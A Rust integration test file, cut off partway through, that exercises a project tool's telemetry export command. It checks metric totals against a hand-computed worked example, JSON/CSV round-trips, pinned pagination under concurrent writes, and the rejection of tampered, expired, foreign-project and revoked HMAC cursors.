//! TM4.3 portable exports end to end, through `herdr-projects telemetry
//! <slug> export` on the CLI over planted canonical rows: totals reconcile
//! with `telemetry query`, JSON and CSV round-trip, pinned pagination under
//! concurrent ingestion, authenticated/scoped/expiring cursors, planted
//! secret sentinels, formula-injection cells and the disabled-by-default
//! external destination. Expected values are hand-computed from contracts
//! §6 (the worked example) and docs/telemetry/contracts-export.md; none is
//! read back from a production aggregate.

#![cfg(all(feature = "state-store", target_os = "linux"))]
#![allow(clippy::disallowed_methods)] // Test-only spawns outside the library may skip the spawn gate.

mod support;

use herdr_projects::store::SqliteStore;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use std::os::unix::fs::PermissionsExt;
use std::sync::atomic::{AtomicBool, Ordering};
use std::{fs, path::PathBuf, process::Command};
use support::telemetry::BIN;

/// Projects under one root, sharing one HOME (one cursor key).
struct Planted { tmp: tempfile::TempDir, root: PathBuf, project: PathBuf }

impl Planted {
    fn new() -> Self {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().join("root");
        let project = root.join("demo");
        fs::create_dir_all(project.join(".state")).unwrap();
        fs::create_dir_all(tmp.path().join("home")).unwrap();
        drop(SqliteStore::create(&project.join(".state/state.db")).unwrap());
        Planted { tmp, root, project }
    }
    fn home(&self) -> PathBuf { self.tmp.path().join("home") }
    fn config(&self) -> PathBuf { self.home().join(".config/herdr-projects") }
    fn db(&self) -> rusqlite::Connection {
        let db = rusqlite::Connection::open(self.project.join(".state/state.db")).unwrap();
        db.execute_batch("PRAGMA foreign_keys=OFF").unwrap();
        db.busy_timeout(std::time::Duration::from_secs(10)).unwrap();
        db
    }
    fn command_in(&self, slug: &str, args: &[&str]) -> std::process::Output {
        Command::new(BIN).env_clear().env("HOME", self.home()).env("PATH", "/usr/bin:/bin")
            .args(["--root", self.root.to_str().unwrap(), "telemetry", slug]).args(args).output().unwrap()
    }
    fn raw_in(&self, slug: &str, args: &[&str]) -> Vec<u8> {
        let out = self.command_in(slug, args);
        assert!(out.status.success(), "{args:?}: {}", String::from_utf8_lossy(&out.stderr));
        out.stdout
    }
    fn raw(&self, args: &[&str]) -> Vec<u8> { self.raw_in("demo", args) }
    fn text(&self, args: &[&str]) -> String { String::from_utf8(self.raw(args)).unwrap() }
    fn json(&self, args: &[&str]) -> Value { serde_json::from_slice(&self.raw(args)).unwrap() }
    fn fail_in(&self, slug: &str, args: &[&str]) -> String {
        let out = self.command_in(slug, args);
        assert!(!out.status.success(), "{args:?} succeeded: {}", String::from_utf8_lossy(&out.stdout));
        assert!(out.stdout.is_empty(), "a refused export prints nothing: {}", String::from_utf8_lossy(&out.stdout));
        String::from_utf8(out.stderr).unwrap()
    }
    fn fail(&self, args: &[&str]) -> String { self.fail_in("demo", args) }
    fn export(&self, args: &[&str]) -> Value {
        let mut all = vec!["export"];
        all.extend_from_slice(args);
        self.json(&all)
    }
}

const OID: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
fn hex(seed: &str) -> String { format!("{:x}", Sha256::digest(seed.as_bytes())) }

type AttemptSpec<'a> = (&'a str, &'a str, &'a [(&'a str, i64)]);

/// As tests/telemetry_query.rs: a task, its attempts and lifecycle marks, an
/// optional contract route, verified result and integration.
fn plant(db: &rusqlite::Connection, task: &str, state: &str, route: Option<&str>, attempts: &[AttemptSpec], verified: Option<(&str, i64)>, integration: Option<(&str, Option<i64>)>) {
    db.execute("INSERT INTO tasks(id,revision,state,title) VALUES(?1,1,?2,?1)", [task, state]).unwrap();
    for (id, attempt_state, marks) in attempts {
        db.execute("INSERT INTO attempts(id,task_id,revision,state,reservation,termination_observed) VALUES(?1,?2,2,?3,?1,?4)",
            rusqlite::params![id, task, attempt_state, i64::from(["completed", "failed", "cancelled", "lost"].contains(attempt_state))]).unwrap();
        for (mark, at) in *marks {
            db.execute("INSERT INTO attempt_lifecycle(attempt_id,state,attempt_revision,unix_ms,source) VALUES(?1,?2,1,?3,'fixture')", rusqlite::params![id, mark, at]).unwrap();
        }
    }
    if let Some(route) = route {
        db.execute("INSERT INTO task_contracts(task_id,contract_revision,project_store,expected_head,repository,base_oid,object_format,route,raw_bytes,raw_digest,installed_seq)
            VALUES(?1,1,'store',1,'/repo',?2,'sha1',?3,x'7b7d',?4,1)", rusqlite::params![task, OID, route, hex(&format!("contract-{task}"))]).unwrap();
    }
    if let Some((attempt, at)) = verified {
        let (submission, result) = (hex(&format!("submission-{task}")), hex(&format!("result-{task}")));
        db.execute("INSERT INTO result_submissions(submission_id,project_store,idempotency_key,payload_digest,payload,task_id,contract_revision,contract_digest,attempt_id,repository,base_oid,candidate_oid,object_format,artifact_manifest,claimed_checks,created_unix_ms)
            VALUES(?1,'store',?1,?2,'{}',?3,1,?2,?4,'/repo',?5,?5,'sha1','[]','[]',?6)", rusqlite::params![submission, hex("d"), task, attempt, OID, at - 10]).unwrap();
        db.execute("INSERT INTO verified_results(result_id,run_id,submission_id,commit_oid,tree_oid,object_format,policy_digest,receipt_digest,isolation,memory_fence,created_unix_ms)
            VALUES(?1,?1,?2,?3,?3,'sha1',?4,?4,'linux-unshare-user-pid-mount-v1',0,?5)", rusqlite::params![result, submission, OID, hex("e"), at]).unwrap();
        if let Some((op_state, integrated)) = integration {
            let operation = format!("op-{task}");
            db.execute("INSERT INTO integration_operations(operation_id,project_store,idempotency_key,payload_digest,repository,ref_name,expected_old_oid,verified_result_id,state,generation,object_format,checks_passed,created_unix_ms)
                VALUES(?1,'store',?1,?2,'/repo','refs/heads/main',?3,?4,?5,1,'sha1',1,?6)", rusqlite::params![operation, hex("f"), OID, result, op_state, at + 10]).unwrap();
            if let Some(integrated) = integrated { integrate(db, task, integrated); }
        }
    }
}

fn integrate(db: &rusqlite::Connection, task: &str, at: i64) {
    db.execute("INSERT INTO integrated_commits(integrated_id,candidate_id,operation_id,repository,ref_name,commit_oid,tree_oid,expected_old_oid,object_format,created_unix_ms)
        VALUES(?1,?1,?2,'/repo','refs/heads/main',?3,?3,?3,'sha1',?4)", rusqlite::params![hex(&format!("integrated-{task}")), format!("op-{task}"), OID, at]).unwrap();
}

/// Contracts §6 worked example: T = {t1, t2, t4}, A = {t1, t2}; t3, t5 open;
/// attempts of T 1 + 2 + 2 = 5; t4's last attempt ends at 3100.
fn worked_example(p: &Planted) {
    let db = p.db();
    plant(&db, "t1", "succeeded", Some("verify_only"), &[("t1-a1", "completed", &[("reserved", 1000), ("completed", 1500)])], Some(("t1-a1", 2000)), None);
    plant(&db, "t2", "succeeded", Some("verify_then_integrate"), &[("t2-a1", "failed", &[("reserved", 1100), ("failed", 1400)]),
        ("t2-a2", "completed", &[("reserved", 1600), ("completed", 1900)])], Some(("t2-a2", 2100)), Some(("integrated", Some(2600))));
    plant(&db, "t3", "blocked", Some("verify_then_integrate"), &[("t3-a1", "completed", &[("reserved", 1200), ("completed", 1800)])], Some(("t3-a1", 2200)), Some(("blocked", None)));
    plant(&db, "t4", "failed", None, &[("t4-a1", "failed", &[("reserved", 1300), ("failed", 2300)]), ("t4-a2", "failed", &[("reserved", 2400), ("failed", 3100)])], None, None);
    plant(&db, "t5", "queued", None, &[("t5-a1", "running", &[("reserved", 1700)])], None, None);
}

/// RFC 4180 reader: records of fields; CRLF record ends; `""` inside quotes.
fn parse_csv(text: &str) -> Vec<Vec<String>> {
    let (mut rows, mut row, mut field, mut quoted, mut chars) = (Vec::new(), Vec::new(), String::new(), false, text.chars().peekable());
    while let Some(c) = chars.next() {
        match (quoted, c) {
            (true, '"') if chars.peek() == Some(&'"') => { chars.next(); field.push('"'); }
            (true, '"') => quoted = false,
            (true, c) => field.push(c),
            (false, '"') if field.is_empty() => quoted = true,
            (false, ',') => row.push(std::mem::take(&mut field)),
            (false, '\r') if chars.peek() == Some(&'\n') => { chars.next(); row.push(std::mem::take(&mut field)); rows.push(std::mem::take(&mut row)); }
            (false, c) => field.push(c),
        }
    }
    assert!(field.is_empty() && row.is_empty() && !quoted, "every record ends with CRLF");
    rows
}

/// CSV rows as maps keyed by the header.
fn csv_maps(text: &str) -> Vec<std::collections::BTreeMap<String, String>> {
    let rows = parse_csv(text);
    let header = rows[0].clone();
    rows[1..].iter().map(|r| { assert_eq!(r.len(), header.len()); header.iter().cloned().zip(r.iter().cloned()).collect() }).collect()
}

const HEADER: &str = "row_kind,metric_id,definition,cohort,window_from,window_to,dimension,dimension_value,record_bucket,record_entity,record_id,value_status,value,value_type,unit,numerator,denominator,exclusions,coverage,coverage_known,coverage_expected,cost_basis,projection_mode,projection_revision,projection_restated,content_digest,as_of,event_cutoff,observation_cutoff,attrs,page_offset,page_total,next_cursor";

/// Contract samples for docs/telemetry/contracts-export.md: written only when
/// `HERDR_EXPORT_SAMPLES` names a directory.
fn sample(name: &str, bytes: &[u8]) {
    if let Some(dir) = std::env::var_os("HERDR_EXPORT_SAMPLES") { fs::write(PathBuf::from(dir).join(name), bytes).unwrap(); }
}

fn metric<'a>(doc: &'a Value, id: &str) -> &'a Value { doc["metrics"].as_array().unwrap().iter().find(|m| m["metric_id"] == id).unwrap() }

/// Totals reconcile with `telemetry query`; typed missing values; JSON and
/// CSV round-trip to the same numbers; files are new, atomic and bounded.
#[test]
fn export_reconciles_with_query_and_round_trips() {
    let p = Planted::new();
    worked_example(&p);
    let doc = p.export(&["--metric", "M01,M02,M07,M49"]);
    sample("metrics.json", &p.raw(&["export", "--metric", "M02,M49"]));
    let m = &doc["manifest"];
    assert_eq!((&m["contract"], &m["schema_version"], &m["format"], &m["timezone"], &m["complete"]), (&json!("export.v1"), &json!(1), &json!("json"), &json!("UTC"), &json!(true)));
    assert_eq!((&m["query"]["contract"], &m["query"]["registry"]), (&json!("analytics-query.v1"), &json!("analytics-registry.v2")));
    assert_eq!(m["query"]["request"]["metrics"], json!(["M01.cohort-v1", "M02.cohort-v1", "M07.cohort-v1", "M49.v1"]));
    assert_eq!(m["page"], json!({"first": true, "last": true, "offset": 0, "rows": 0, "page_size": null, "total": null, "next_cursor": null, "next_cursor_expires_unix_ms": null}));
    assert!(m["export_id"].as_str().unwrap().starts_with("sha256:"));

    // Hand-computed (contracts §6): M02 = 2/3, M07 = 5/2, M01 = 2, M49 absent.
    let m02 = metric(&doc, "M02");
    assert_eq!((&m02["value"], &m02["value_type"], &m02["value_status"], &m02["numerator"], &m02["denominator"]),
        (&json!("2/3"), &json!("ratio"), &json!("available"), &json!(2), &json!(3)));
    assert_eq!((&m02["exclusions"], &m02["cohort"], &m02["definition"]), (&json!({"open": 2}), &json!("terminal_cohort"), &json!("M02.cohort-v1")));
    assert_eq!(m02["coverage"], json!({"state": "complete", "known": 3, "expected": 3, "missing": 0, "reasons": {}}));
    assert_eq!((&m02["as_of"]["requested"], &m02["as_of"]["event_cutoff_unix_ms"]), (&Value::Null, &json!(3100)));
    assert_eq!(m02["cost_basis"], json!({"status": "not_applicable", "reason": "not_a_cost_metric"}));
    assert_eq!((&m02["missing"], &m02["projection"]["mode"]), (&json!({}), &json!("live")));
    assert_eq!((&metric(&doc, "M07")["value"], &metric(&doc, "M07")["numerator"], &metric(&doc, "M07")["denominator"]), (&json!("5/2"), &json!(5), &json!(2)));
    let m01 = metric(&doc, "M01");
    assert_eq!((&m01["value"], &m01["value_type"], &m01["denominator"], &m01["missing"]), (&json!(2), &json!("integer"), &Value::Null, &json!({"denominator": "not_applicable:no_denominator"})));
    let m49 = metric(&doc, "M49");
    assert_eq!((&m49["status"], &m49["value"], &m49["value_status"]), (&json!("unavailable"), &Value::Null, &json!("unavailable:no_replay_suite")));
    assert_eq!(m49["missing"], json!({"value": "unavailable:no_replay_suite", "numerator": "unavailable:no_replay_suite", "denominator": "unavailable:no_replay_suite"}));

    // Reconcile with the query service, field for field.
    let q = p.json(&["query", "--json", "--metric", "M01,M02,M07,M49"]);
    for r in q["results"].as_array().unwrap() {
        let e = metric(&doc, r["metric_id"].as_str().unwrap());
        for key in ["numerator", "denominator", "exclusions", "coverage", "definition", "cohort", "window", "certification", "event_cutoff_unix_ms"] {
            let exported = if key == "event_cutoff_unix_ms" { &e["as_of"][key] } else { &e[key] };
            assert_eq!(exported, &r[key], "{} {key}", r["metric_id"]);
        }
        if r["status"] != "unavailable" { assert_eq!(e["value"], r["value"], "{}", r["metric_id"]); }
        assert_eq!(e["projection"]["content_digest"], r["projection"]["content_digest"], "same snapshot");
    }

    // CSV: header, one row per metric, typed missing values, closing page row.
    let text = p.text(&["export", "--metric", "M01,M02,M07,M49", "--format", "csv"]);
    assert!(text.starts_with(&format!("{HEADER}\r\n")), "{text}");
    let rows = csv_maps(&text);
    assert_eq!(rows.iter().map(|r| r["row_kind"].as_str()).collect::<Vec<_>>(), ["metric", "metric", "metric", "metric", "page"]);
    let row = |id: &str| rows.iter().find(|r| r["metric_id"] == id).unwrap();
    let m02 = row("M02");
    for (col, want) in [("definition", "M02.cohort-v1"), ("cohort", "terminal_cohort"), ("window_from", "unbounded"), ("window_to", "unbounded"),
        ("value_status", "available"), ("value", "2/3"), ("value_type", "ratio"), ("unit", "ratio"), ("numerator", "2"), ("denominator", "3"),
        ("exclusions", "{\"open\":2}"), ("coverage", "complete"), ("coverage_known", "3"), ("coverage_expected", "3"), ("cost_basis", "not_applicable:not_a_cost_metric"),
        ("projection_mode", "live"), ("projection_revision", "none:live"), ("projection_restated", "none:live"), ("as_of", "live"),
        ("event_cutoff", "1970-01-01T00:00:03.1Z"), ("dimension", ""), ("record_id", ""), ("attrs", "")] {
        assert_eq!(m02[col], want, "M02 {col}");
    }
    assert_eq!(m02["content_digest"], metric(&doc, "M02")["projection"]["content_digest"].as_str().unwrap());
    assert_eq!((row("M01")["value"].as_str(), row("M01")["denominator"].as_str()), ("2", "not_applicable:no_denominator"));
    assert_eq!((row("M49")["value"].as_str(), row("M49")["value_status"].as_str(), row("M49")["numerator"].as_str(), row("M49")["event_cutoff"].as_str()),
        ("unavailable:no_replay_suite", "unavailable:no_replay_suite", "unavailable:no_replay_suite", "unavailable:no_event_in_cohort"));
    let page = rows.last().unwrap();
    assert_eq!((page["page_offset"].as_str(), page["page_total"].as_str(), page["next_cursor"].as_str()), ("0", "not_applicable:no_records", "none:last_page"));
    // Round trip: every CSV metric row parses back to the JSON export's values.
    for r in rows.iter().filter(|r| r["row_kind"] == "metric") {
        let e = metric(&doc, &r["metric_id"]);
        for col in ["value", "numerator", "denominator"] {
            let back = match &e[col] { Value::Null => json!(e["missing"][col]), Value::String(s) => json!(s), v => json!(v.to_string()) };
            assert_eq!(json!(r[col]), back, "{} {col}", r["metric_id"]);
        }
        assert_eq!(serde_json::from_str::<Value>(&r["exclusions"]).unwrap(), e["exclusions"]);
    }
    // No empty cell in a column that applies to a metric row.
    for r in rows.iter().filter(|r| r["row_kind"] == "metric") {
        for col in ["value", "value_status", "numerator", "denominator", "coverage", "cost_basis", "event_cutoff", "observation_cutoff", "content_digest", "as_of"] {
            assert!(!r[col].is_empty(), "{} {col} is never empty", r["metric_id"]);
        }
    }

    // Dimension cells: one CSV row per cell, as the query's cells.
    let by = p.export(&["--metric", "M02", "--by", "route"]);
    assert_eq!(by["metrics"][0]["cells"].as_array().unwrap().iter().map(|c| (c["dimension"]["route"].clone(), c["value"].clone())).collect::<Vec<_>>(),
        [(json!("none"), json!("0/1")), (json!("verify_only"), json!("1/1")), (json!("verify_then_integrate"), json!("1/1"))]);
    let cells = csv_maps(&p.text(&["export", "--metric", "M02", "--by", "route", "--format", "csv"]));
    sample("metrics.csv", &p.raw(&["export", "--metric", "M01,M02,M49", "--by", "route", "--format", "csv"]));
    assert_eq!(cells.iter().filter(|r| r["row_kind"] == "cell").map(|r| (r["dimension"].as_str(), r["dimension_value"].as_str(), r["value"].as_str(), r["denominator"].as_str())).collect::<Vec<_>>(),
        [("route", "none", "0/1", "1"), ("route", "verify_only", "1/1", "1"), ("route", "verify_then_integrate", "1/1", "1")]);
    // A window with no terminal task: typed `empty`, never 0/0 or blank.
    let empty = p.export(&["--metric", "M02", "--from", "3200"]);
    assert_eq!((&empty["metrics"][0]["value_status"], &empty["metrics"][0]["missing"]["value"]), (&json!("empty:empty_denominator"), &json!("empty:empty_denominator")));

    // --out: a new file with the same page; never replaced; CSV has a companion manifest.
    let out = p.tmp.path().join("export.json");
    let receipt = p.json(&["export", "--metric", "M01,M02,M07,M49", "--out", out.to_str().unwrap()]);
    let written: Value = serde_json::from_slice(&fs::read(&out).unwrap()).unwrap();
    assert_eq!((&receipt["export_id"], &written["manifest"]["export_id"]), (&doc["manifest"]["export_id"], &doc["manifest"]["export_id"]), "same snapshot, same id");
    assert_eq!(stable(&written["metrics"]), stable(&doc["metrics"]));
    assert_eq!(receipt["written"][0]["digest"], json!(format!("sha256:{}", hex_bytes(&fs::read(&out).unwrap()))));
    assert_eq!(fs::metadata(&out).unwrap().permissions().mode() & 0o777, 0o600);
    assert!(p.fail(&["export", "--metric", "M02", "--out", out.to_str().unwrap()]).contains("exists"));
    let csv_out = p.tmp.path().join("export.csv");
    p.raw(&["export", "--metric", "M02", "--format", "csv", "--out", csv_out.to_str().unwrap()]);
    let companion: Value = serde_json::from_slice(&fs::read(p.tmp.path().join("export.csv.manifest.json")).unwrap()).unwrap();
    assert_eq!((&companion["contract"], &companion["format"]), (&json!("export.v1"), &json!("csv")));
    assert_eq!(companion["data"]["digest"], json!(format!("sha256:{}", hex_bytes(&fs::read(&csv_out).unwrap()))));
    assert!(fs::read_dir(p.tmp.path()).unwrap().all(|e| !e.unwrap().file_name().to_string_lossy().contains("partial")), "no partial file remains");

    // Bounded: over the byte cap nothing is written; the cap itself is bounded.
    let capped = p.tmp.path().join("capped.json");
    assert!(p.fail(&["export", "--metric", "M02", "--max-bytes", "100", "--out", capped.to_str().unwrap()]).contains("export rejected: {\"bytes\":"));
    assert!(!capped.exists());
    assert!(p.fail(&["export", "--metric", "M02", "--max-bytes", "9000000"]).contains("max_bytes_out_of_range"));
    assert!(p.fail(&["export", "--metric", "M02", "--drill", "denominator", "--page-size", "501"]).contains("page_size_out_of_range"));
    assert!(p.fail(&["export", "--metric", "M02", "--cohort", "completed_task"]).contains("ambiguous_cohort"));
    assert!(p.fail(&["export", "--metric", "M02", "--cursor", "c2.00.00"]).contains("cursor_needs_drill"));
}

fn hex_bytes(bytes: &[u8]) -> String { format!("{:x}", Sha256::digest(bytes)) }

/// A live export's observation cutoff is its query time; without it two
/// exports of the same snapshot are equal.
fn stable(metrics: &Value) -> Value {
    let mut m = metrics.clone();
    for x in m.as_array_mut().unwrap() { x["as_of"]["observation_cutoff_unix_ms"] = Value::Null; }
    m
}

/// A late correction restates the cell; an export as of the earlier revision
/// reproduces the old totals and says it was superseded (doc 08 §2).
#[test]
fn corrections_are_preserved_in_exports() {
    let p = Planted::new();
    worked_example(&p);
    p.raw(&["collect"]);
    let first = p.json(&["analytics", "refresh"]);
    let cell = |out: &Value| out["appended"].as_array().unwrap().iter().find(|a| a["cell"]["definition"] == "M02.cohort-v1").map(|a| a["revision"].as_i64().unwrap()).unwrap();
    let r1 = cell(&first);
    let db = p.db();
    db.execute("UPDATE integration_operations SET state='integrated' WHERE operation_id='op-t3'", []).unwrap();
    integrate(&db, "t3", 2700);
    drop(db);
    let r2 = cell(&p.json(&["analytics", "refresh"]));
    let old = p.export(&["--metric", "M02", "--as-of-seq", &r1.to_string()]);
    let m = &old["metrics"][0];
    assert_eq!((&m["value"], &m["numerator"], &m["denominator"]), (&json!("2/3"), &json!(2), &json!(3)));
    assert_eq!((&m["projection"]["revision"], &m["projection"]["restated"], &m["projection"]["superseded_by"], &m["projection"]["current_revision"]),
        (&json!(r1), &json!(true), &json!(r2), &json!(r2)));
    assert_eq!(m["as_of"]["requested"], json!({"unix_ms": null, "seq": r1}));
    let new = p.export(&["--metric", "M02", "--as-of-seq", &r2.to_string()]);
    assert_eq!((&new["metrics"][0]["value"], &new["metrics"][0]["projection"]["supersedes"]), (&json!("3/4"), &json!(r1)));
    assert_ne!(old["manifest"]["export_id"], new["manifest"]["export_id"]);
    let rows = csv_maps(&p.text(&["export", "--metric", "M02", "--as-of-seq", &r1.to_string(), "--format", "csv"]));
    assert_eq!((rows[0]["value"].as_str(), rows[0]["projection_mode"].as_str(), rows[0]["projection_revision"].as_str(), rows[0]["projection_restated"].as_str(), rows[0]["as_of"].as_str()),
        ("2/3", "revision", r1.to_string().as_str(), "true", format!("seq:{r1}").as_str()));
    // Before any revision: typed, never a guess.
    let none = p.export(&["--metric", "M02", "--as-of", "1"]);
    assert_eq!((&none["metrics"][0]["value_status"], &none["metrics"][0]["missing"]["numerator"]), (&json!("unavailable:no_revision_as_of"), &json!("unavailable:no_revision_as_of")));
}

fn ids(doc: &Value) -> Vec<String> { doc["records"]["rows"].as_array().unwrap().iter().map(|r| r["id"].as_str().unwrap().to_owned()).collect() }

/// Pinned pagination while canonical rows and analytics restatements arrive:
/// pages concatenate to the frozen snapshot's records exactly once each, in
/// JSON and CSV alike, and the record total equals the metric's numerator.
#[test]
fn pagination_under_concurrent_ingestion_is_exact() {
    let p = Planted::new();
    worked_example(&p);
    p.raw(&["collect"]);
    p.raw(&["analytics", "refresh"]);
    let page = |format: &str, cursor: Option<&str>| {
        let mut args = vec!["export", "--metric", "M07", "--drill", "numerator", "--page-size", "2", "--format", format];
        if let Some(c) = cursor { args.extend(["--cursor", c]); }
        p.text(&args)
    };
    let first: Value = serde_json::from_str(&page("json", None)).unwrap();
    let pinned = first["records"]["snapshot"]["revision"].as_i64().expect("pinned to the recorded revision");
    assert_eq!((&first["metrics"][0]["numerator"], &first["records"]["total"], &first["manifest"]["page"]["first"]), (&json!(5), &json!(5), &json!(true)));
    assert_eq!(ids(&first), ["t1-a1", "t2-a1"]);
    assert!(first["manifest"]["page"]["next_cursor_expires_unix_ms"].as_i64().unwrap() > first["manifest"]["created_unix_ms"].as_i64().unwrap());

    // Ingest concurrently: new attempts on t4 and analytics restatements.
    let stop = AtomicBool::new(false);
    let (mut seen, mut ids_all) = (Vec::new(), ids(&first));
    std::thread::scope(|scope| {
        let writer = scope.spawn(|| {
            let db = p.db();
            let mut n = 0;
            while !stop.load(Ordering::SeqCst) {
                n += 1;
                db.execute("INSERT INTO attempts(id,task_id,revision,state,reservation,termination_observed) VALUES(?1,'t4',2,'failed',?1,1)", [format!("t4-x{n:03}")]).unwrap();
                if n % 2 == 0 { p.raw(&["analytics", "refresh"]); }
                std::thread::sleep(std::time::Duration::from_millis(5));
            }
            n
        });
        let mut cursor = first["manifest"]["page"]["next_cursor"].as_str().map(str::to_owned);
        let mut csv = true;
        while let Some(c) = cursor.take() {
            std::thread::sleep(std::time::Duration::from_millis(30));
            if csv {
                let rows = csv_maps(&page("csv", Some(&c)));
                assert!(rows.iter().all(|r| r["row_kind"] == "record" || r["row_kind"] == "page"), "continuation pages carry records only");
                for r in rows.iter().filter(|r| r["row_kind"] == "record") {
                    assert_eq!(r["projection_revision"], pinned.to_string());
                    ids_all.push(r["record_id"].clone());
                }
                cursor = rows.last().map(|r| r["next_cursor"].clone()).filter(|c| c != "none:last_page");
            } else {
                let doc: Value = serde_json::from_str(&page("json", Some(&c))).unwrap();
                assert_eq!((&doc["records"]["snapshot"]["revision"], &doc["metrics"], &doc["manifest"]["export_id"]), (&json!(pinned), &json!([]), &first["manifest"]["export_id"]));
                ids_all.extend(ids(&doc));
                cursor = doc["manifest"]["page"]["next_cursor"].as_str().map(str::to_owned);
            }
            csv = !csv;
            seen.push(());
        }
        stop.store(true, Ordering::SeqCst);
        assert!(writer.join().unwrap() > 0, "ingestion ran while paging");
    });
    assert_eq!(seen.len(), 2, "two continuation pages");
    assert_eq!(ids_all, ["t1-a1", "t2-a1", "t2-a2", "t4-a1", "t4-a2"], "the frozen snapshot: no duplicate, no skip, no new arrival");
    assert!(p.json(&["query", "--json", "--metric", "M07"])["results"][0]["numerator"].as_i64().unwrap() > 5, "the live answer moved on");
    assert!(p.json(&["analytics", "revisions", "--metric", "M07"])["revisions"].as_array().unwrap().len() > 1, "restatements were appended while paging");
}

fn hmac(key: &[u8], msg: &[u8]) -> String {
    let mut block = [0u8; 64];
    block[..key.len()].copy_from_slice(key);
    let pad = |x: u8| block.iter().map(|b| b ^ x).collect::<Vec<u8>>();
    let inner = Sha256::new().chain_update(pad(0x36)).chain_update(msg).finalize();
    format!("{:x}", Sha256::new().chain_update(pad(0x5c)).chain_update(inner).finalize())
}
fn unhex(text: &str) -> Vec<u8> { (0..text.len()).step_by(2).map(|i| u8::from_str_radix(&text[i..i + 2], 16).unwrap()).collect() }
fn tohex(bytes: &[u8]) -> String { bytes.iter().map(|b| format!("{b:02x}")).collect() }

/// Cursors are keyed (MAC), scoped to the project, expiring and revocable;
/// the query service's drill-down shares them.
#[test]
fn malformed_tampering_is_invalid_and_deleted_cursor_keys_are_revoked() {
    let p = Planted::new();
    worked_example(&p);
    let args = ["export", "--metric", "M07", "--drill", "numerator", "--page-size", "2"];
    let first = p.json(&args);
    let cursor = first["manifest"]["page"]["next_cursor"].as_str().unwrap();
    let parts: Vec<&str> = cursor.split('.').collect();
    // Replace the JSON with an unterminated object, retaining the original MAC.
    let tampered = format!("c2.7b.{}", parts[2]);
    let refusal = |token: &str| {
        let mut request = args.to_vec();
        request.extend(["--cursor", token]);
        p.fail(&request)
    };
    assert!(refusal(&tampered).contains("\"code\":\"invalid_cursor\""));
    fs::remove_file(p.config().join("telemetry-cursor.key")).unwrap();
    assert!(refusal(cursor).contains("\"code\":\"cursor_revoked\""));
    // Issue a replacement key too: the old, well-formed payload still diagnoses revocation.
    let fresh = p.json(&args);
    assert_ne!(fresh["manifest"]["page"]["next_cursor"], cursor);
    assert!(refusal(cursor).contains("\"code\":\"cursor_revoked\""));
    assert!(refusal(&tampered).contains("\"code\":\"invalid_cursor\""));
}

#[test]
fn cursors_are_authenticated_scoped_and_expiring() {
    let p = Planted::new();
    worked_example(&p);
    let args = ["export", "--metric", "M07", "--drill", "numerator", "--page-size", "2"];
    let first = p.json(&args);
    sample("records.json", serde_json::to_string_pretty(&first).unwrap().as_bytes());
    sample("records.csv", &p.raw(&["export", "--metric", "M07", "--drill", "numerator", "--page-size", "2", "--format", "csv"]));
    let cursor = first["manifest"]["page"]["next_cursor"].as_str().unwrap().to_owned();
    let with = |c: &str| { let mut a = args.to_vec(); a.extend(["--cursor", c]); a.into_iter().map(str::to_owned).collect::<Vec<_>>() };
    fn refs(v: &[String]) -> Vec<&str> { v.iter().map(String::as_str).collect() }
    assert_eq!(ids(&p.json(&refs(&with(&cursor)))), ["t2-a2", "t4-a1"]);

    // The key: owner-only under the config dir, generated on first use, never exported.
    let key_path = p.config().join("telemetry-cursor.key");
    let key_hex = fs::read_to_string(&key_path).unwrap();
    assert_eq!((key_hex.len(), fs::metadata(&key_path).unwrap().permissions().mode() & 0o777), (64, 0o600));
    assert!(!serde_json::to_string(&first).unwrap().contains(&key_hex));

    // Shape `c2.<hex payload>.<hex mac>`; the payload names no path.
    let parts: Vec<&str> = cursor.split('.').collect();
    assert_eq!((parts.len(), parts[0], parts[2].len()), (3, "c2", 64));
    let payload: Value = serde_json::from_slice(&unhex(parts[1])).unwrap();
    assert_eq!((&payload["v"], &payload["kind"], &payload["bucket"], &payload["next"]), (&json!(2), &json!("analytics-drill"), &json!("numerator"), &json!(2)));
    assert_eq!(payload["exp"].as_i64().unwrap() - payload["iat"].as_i64().unwrap(), 30 * 60 * 1000);
    assert!(!String::from_utf8(unhex(parts[1])).unwrap().contains('/'), "project scope is a digest, never a path");
    assert_eq!(parts[2], hmac(&unhex(&key_hex), &unhex(parts[1])), "HMAC-SHA256 of the payload bytes");

    // Tampered payload (next 2 -> 0) without the key: refused.
    let forged = String::from_utf8(unhex(parts[1])).unwrap().replace("\"next\":2", "\"next\":0");
    let tampered = format!("c2.{}.{}", tohex(forged.as_bytes()), parts[2]);
    assert!(p.fail(&refs(&with(&tampered))).contains("\"code\":\"invalid_cursor\""));
    assert!(p.fail(&refs(&with("c2.00.00"))).contains("invalid_cursor"));
    // Expired: correctly keyed, but past its expiry.
    let mut old = payload.clone();
    old["exp"] = json!(payload["iat"].as_i64().unwrap() - 1);
    let text = serde_json::to_string(&old).unwrap();
    let expired = format!("c2.{}.{}", tohex(text.as_bytes()), hmac(&unhex(&key_hex), text.as_bytes()));
    assert!(p.fail(&refs(&with(&expired))).contains("\"code\":\"cursor_expired\""));
    // Foreign project: the same request on another project of the same user.
    let other = p.root.join("other");
    fs::create_dir_all(other.join(".state")).unwrap();
    fs::copy(p.project.join(".state/state.db"), other.join(".state/state.db")).unwrap();
    let mut foreign = vec!["export", "--metric", "M07", "--drill", "numerator", "--page-size", "2", "--cursor", &cursor];
    assert!(p.fail_in("other", &foreign).contains("\"code\":\"cursor_foreign_project\""));
    foreign.truncate(7);
    assert_eq!(ids(&serde_json::from_slice(&p.raw_in("other", &foreign)).unwrap()), ["t1-a1", "t2-a1"], "the other project pages its own snapshot");
    // Another request: mismatch; the query service shares the cursor.
    assert!(p.fail(&["export", "--metric", "M07", "--drill", "numerator", "--page-size", "3", "--cursor", &cursor]).contains("cursor_mismatch"));
    let q = p.json(&["query", "--json", "--metric", "M07", "--drill", "numerator", "--page-size", "2", "--cursor", &cursor]);
    assert_eq!(q["drill"]["rows"].as_array().unwrap().iter().map(|r| r["id"].as_str().unwrap()).collect::<Vec<_>>(), ["t2-a2", "t4-a1"]);
    assert!(p.fail(&["query", "--metric", "M07", "--drill", "numerator", "--page-size", "2", "--cursor", &expired]).contains("query rejected: {\"code\":\"cursor_expired\""));
    // Revocation: removing the key revokes every outstanding cursor.
    fs::remove_file(&key_path).unwrap();
    assert!(p.fail(&refs(&with(&cursor))).contains("\"code\":\"cursor_revoked\""));
